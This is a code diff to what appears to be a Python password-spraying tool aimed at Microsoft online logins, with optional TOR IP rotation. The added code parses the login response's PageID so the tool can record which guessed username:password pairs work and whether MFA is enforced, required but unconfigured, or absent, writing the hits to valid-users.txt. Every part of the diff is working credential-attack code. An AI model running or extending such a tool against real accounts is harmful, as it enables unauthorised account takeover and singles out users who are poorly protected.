@@ -116,7 +116,14 @@ def renew_tor_ip():
             get_tor_ip()
     except Exception as e:
         print(f"{BOLD_RED}[✗] Failed to renew TOR IP: {e}{RESET}")
-        
+
+
+def get_pageid_from_response(response_text):
+    match = re.search(r'<meta\s+name="PageID"\s+content="([^"]+)"', response_text)
+    if match:
+        return match.group(1)
+    return None
+
 transport = None
 if args.proxytor:
     last_ip_renewal = time.time()
@@ -1130,12 +1137,25 @@ if args.password:
                         with httpx.Client(transport=transport, timeout=20, http2=True ) as client:
                             response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
                             cookies_dict = dict(response_check_password.cookies)
+                            pageid = get_pageid_from_response(response_check_password.text)
                             if args.check:
                                 if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
-                                    with open("valid-users.txt", "a") as log_file:
-                                        log_file.write(f"{username}:{password}\n")
-                                    break            
+                                    if pageid == "ConvergedProofUpRedirect":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required but not configured {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
+                                        break
+
+                                    elif pageid == "ConvergedTFA":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required \n")
+                                        break
+                                    else:
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} \n")                                   
+                                        break            
                                 else:
                                     if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                         print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
@@ -1146,13 +1166,26 @@ if args.password:
                                         print(f"{CYAN}[!] NOT-success: {username} exists, Failed to authenticate with password: {password}{RESET}")
                                         with open("valid-users.txt", "a") as log_file:
                                             log_file.write(f"{username}\n")
+                                        break
                                         
                             else :
                                 if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
-                                    with open("valid-users.txt", "a") as log_file:
-                                        log_file.write(f"{username}:{password}\n")
-                                    break            
+                                    if pageid == "ConvergedProofUpRedirect":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required but not configured {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
+                                        break
+
+                                    elif pageid == "ConvergedTFA":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required \n")
+                                        break
+                                    else:
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} \n")                                   
+                                        break                   
                                 else:
                                     if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                         print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
@@ -1410,12 +1443,25 @@ if args.password:
                         with httpx.Client(timeout=20, http2=True ) as client:
                             response_check_password = client.post(url_check_password, headers=headers_check_password, cookies=cookies_check_password, data=data_check_password)
                             cookies_dict = dict(response_check_password.cookies)
+                            pageid = get_pageid_from_response(response_check_password.text)
                             if args.check:
                                 if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
-                                    with open("valid-users.txt", "a") as log_file:
-                                        log_file.write(f"{username}:{password}\n")
-                                    break            
+                                    if pageid == "ConvergedProofUpRedirect":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required but not configured {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
+                                        break
+
+                                    elif pageid == "ConvergedTFA":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required \n")
+                                        break
+                                    else:
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} \n")                                   
+                                        break                  
                                 else:
                                     if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                         print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
@@ -1429,10 +1475,22 @@ if args.password:
                                         
                             else :
                                 if "ESTSAUTHPERSISTENT" in cookies_dict:
-                                    print(f"{BOLD_GREEN}[✓] User {username} is exist and seccessfully logged in with password: {password}{RESET}")
-                                    with open("valid-users.txt", "a") as log_file:
-                                        log_file.write(f"{username}:{password}\n")
-                                    break            
+                                    if pageid == "ConvergedProofUpRedirect":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required but not configured {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required but not configured \n")
+                                        break
+
+                                    elif pageid == "ConvergedTFA":
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password}, MFA required {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} - MFA required \n")
+                                        break
+                                    else:
+                                        print(f"{BOLD_GREEN}[✓] User {username} is exist, and seccessfully logged in with password: {password} {RESET}")
+                                        with open("valid-users.txt", "a") as log_file:
+                                            log_file.write(f"{username}:{password} \n")                                   
+                                        break                    
                                 else:
                                     if "<html><head><title>Working...</title></head>" in response_check_password.text:
                                         print(f"{BOLD_GREEN}[✓] User {username} is exist and logged in with password: {password}  with redirect to federation server{RESET}")
